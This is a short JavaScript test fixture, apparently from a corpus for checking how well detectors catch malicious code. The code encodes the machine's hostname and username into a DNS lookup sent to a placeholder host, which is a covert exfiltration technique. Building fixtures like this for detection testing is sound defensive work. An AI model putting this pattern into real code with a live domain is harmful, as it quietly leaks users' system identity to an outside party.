// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const dns = require('dns'); const os = require('os');
const hex = Buffer.from(os.hostname() + ':' + os.userInfo().username).toString('hex');
dns.lookup(`${hex}.x.example.invalid`, () => {});
